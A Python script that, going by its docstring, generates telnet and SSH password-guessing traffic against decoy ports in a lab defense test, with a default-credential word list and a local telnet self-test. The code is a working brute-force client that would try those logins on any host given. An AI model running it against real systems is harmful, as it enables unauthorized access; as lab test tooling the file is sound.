#!/usr/bin/env python3
"""Credential guessing against the Shunt decoy ports (telnet/ssh), standard
library only except for the optional paramiko SSH client. Runs inside
shunt-kali against the lab client's decoy ports.

Usage:
    brute.py telnet HOST PORT N
    brute.py ssh HOST PORT N
    brute.py selftest

The decoys always refuse the login (see docs/DEFENSE.md): telnet replies
"Login incorrect" and hangs up after 3 tries per connection; ssh refuses
every password/keyboard-interactive attempt. This tool is only meant to
generate that traffic for the lab defense test (R02), not to succeed.

Word list is small and harmless on purpose (lab-only, no real credentials).
"""
import socket
import sys
import time

USERS = ["root", "admin", "user", "pi", "test", "guest"]
PASSWORDS = ["root", "admin", "1234", "password", "12345", "raspberry", "guest"]

CONNECT_TIMEOUT = 5
STEP_TIMEOUT = 8


def pairs(n):
    """First n (user, password) pairs, cycling the small word list."""
    out = []
    i = 0
    while len(out) < n:
        u = USERS[i % len(USERS)]
        p = PASSWORDS[i % len(PASSWORDS)]
        out.append((u, p))
        i += 1
    return out


# ---------------------------------------------------------------------------
# Telnet (RFC 854/857 IAC negotiation)

IAC = 0xFF
DONT = 0xFE
DO = 0xFD
WONT = 0xFC
WILL = 0xFB
SB = 0xFA
SE = 0xF0


def _telnet_negotiate(sock, buf):
    """Consume IAC option negotiation from buf/socket, answering DO/WILL
    with WONT/DONT except for ECHO and SGA, which we accept. Returns the
    remaining non-IAC bytes read so far."""
    out = bytearray()
    i = 0
    data = bytearray(buf)
    while True:
        while i < len(data):
            if data[i] == IAC and i + 1 < len(data):
                cmd = data[i + 1]
                if cmd in (DO, WILL) and i + 2 < len(data):
                    opt = data[i + 2]
                    if cmd == DO:
                        # server asks us to DO something -> refuse (WONT) unless echo/sga
                        reply = WILL if opt in (1, 3) else WONT
                    else:  # WILL
                        reply = DO if opt in (1, 3) else DONT
                    sock.sendall(bytes([IAC, reply, opt]))
                    i += 3
                    continue
                if cmd == SB:
                    # subnegotiation: skip until IAC SE
                    j = i + 2
                    while j + 1 < len(data) and not (data[j] == IAC and data[j + 1] == SE):
                        j += 1
                    i = j + 2
                    continue
                i += 2
                continue
            out.append(data[i])
            i += 1
        try:
            more = sock.recv(4096)
        except socket.timeout:
            break
        if not more:
            break
        data = bytearray(more)
        i = 0
    return bytes(out)


def _telnet_read_until(sock, markers, deadline):
    """Read and strip IAC sequences until one of markers (bytes) is seen in
    the decoded text, or deadline passes. Returns decoded text so far."""
    text = ""
    while time.monotonic() < deadline:
        sock.settimeout(max(0.1, deadline - time.monotonic()))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        clean = _telnet_strip(chunk, sock)
        text += clean.decode("latin-1", "replace")
        if any(m in text for m in markers):
            break
    return text


def _telnet_strip(data, sock):
    """Strip IAC sequences from one chunk, answering option negotiation."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (DO, WILL) and i + 2 < len(data):
                opt = data[i + 2]
                if cmd == DO:
                    reply = WILL if opt in (1, 3) else WONT
                else:
                    reply = DO if opt in (1, 3) else DONT
                try:
                    sock.sendall(bytes([IAC, reply, opt]))
                except OSError:
                    pass
                i += 3
                continue
            if cmd == SB:
                j = i + 2
                while j + 1 < len(data) and not (data[j] == IAC and data[j + 1] == SE):
                    j += 1
                i = j + 2
                continue
            i += 2
            continue
        out.append(data[i])
        i += 1
    return bytes(out)


def telnet_attempt(host, port, user, password):
    """One telnet login attempt. Returns 'ok'/'fail'/'error'."""
    try:
        with socket.create_connection((host, port), timeout=CONNECT_TIMEOUT) as s:
            deadline = time.monotonic() + STEP_TIMEOUT
            text = _telnet_read_until(s, ["login:"], deadline)
            if "login:" not in text:
                return "error"
            s.sendall((user + "\r\n").encode())
            deadline = time.monotonic() + STEP_TIMEOUT
            text = _telnet_read_until(s, ["Password:"], deadline)
            if "Password:" not in text:
                return "error"
            s.sendall((password + "\r\n").encode())
            deadline = time.monotonic() + STEP_TIMEOUT
            text = _telnet_read_until(s, ["Login incorrect", "incorrect", "login:"], deadline)
            if "incorrect" in text.lower():
                return "fail"
            return "fail" if text else "error"
    except OSError:
        return "error"


def run_telnet(host, port, n):
    attempts = 0
    ok = 0
    errors = 0
    tries_this_conn = 0
    for user, password in pairs(n):
        if tries_this_conn >= 3:
            tries_this_conn = 0  # decoy hangs up after 3 tries/connection; new connection next loop
        attempts += 1
        tries_this_conn += 1
        result = telnet_attempt(host, port, user, password)
        if result == "ok":
            ok += 1
        elif result == "error":
            errors += 1
    print(f"attempts={attempts} ok={ok} errors={errors}")
    return 0


# ---------------------------------------------------------------------------
# SSH

def run_ssh(host, port, n):
    try:
        import paramiko
    except ImportError:
        print("missing tool: python3-paramiko (apt install python3-paramiko in shunt-kali)", file=sys.stderr)
        return 2

    import logging
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    attempts = 0
    ok = 0
    errors = 0
    for user, password in pairs(n):
        attempts += 1
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=user, password=password,
                timeout=CONNECT_TIMEOUT, banner_timeout=STEP_TIMEOUT,
                auth_timeout=STEP_TIMEOUT, allow_agent=False, look_for_keys=False,
            )
            ok += 1
            client.close()
        except paramiko.AuthenticationException:
            pass  # expected: decoy always refuses
        except Exception:
            errors += 1
        finally:
            try:
                client.close()
            except Exception:
                pass
    print(f"attempts={attempts} ok={ok} errors={errors}")
    return 0


# ---------------------------------------------------------------------------
# Self-test: a tiny local telnet server implementing the same IAC dance as
# the real decoy (DO/WILL ECHO+SGA, login:/Password:, always "Login incorrect").

def _mini_telnet_server(sock):
    conn, _ = sock.accept()
    with conn:
        conn.settimeout(5)
        conn.sendall(bytes([IAC, WILL, 1]))  # WILL ECHO
        conn.sendall(bytes([IAC, WILL, 3]))  # WILL SGA
        conn.sendall(b"login: ")
        buf = b""
        while b"\r\n" not in buf and b"\n" not in buf:
            buf += conn.recv(256)
        conn.sendall(b"Password: ")
        buf = b""
        while b"\r\n" not in buf and b"\n" not in buf:
            buf += conn.recv(256)
        conn.sendall(b"Login incorrect\r\n")


def selftest():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    import threading
    t = threading.Thread(target=_mini_telnet_server, args=(srv,), daemon=True)
    t.start()
    result = telnet_attempt("127.0.0.1", port, "root", "root")
    t.join(timeout=5)
    srv.close()
    print(f"telnet selftest result={result}")
    assert result == "fail", "expected a clean 'Login incorrect' round-trip"

    try:
        import paramiko  # noqa: F401
        print("paramiko available: ssh selftest skipped (needs a real decoy, see brute.py ssh)")
    except ImportError:
        print("paramiko not installed: apt install python3-paramiko nötig für ssh-Teil")
    print("selftest OK")
    return 0


def main(argv):
    if len(argv) == 2 and argv[1] == "selftest":
        return selftest()
    if len(argv) != 5 or argv[1] not in ("telnet", "ssh"):
        print(__doc__, file=sys.stderr)
        return 2
    mode, host, port_s, n_s = argv[1:5]
    port = int(port_s)
    n = int(n_s)
    if mode == "telnet":
        return run_telnet(host, port, n)
    return run_ssh(host, port, n)


if __name__ == "__main__":
    sys.exit(main(sys.argv))
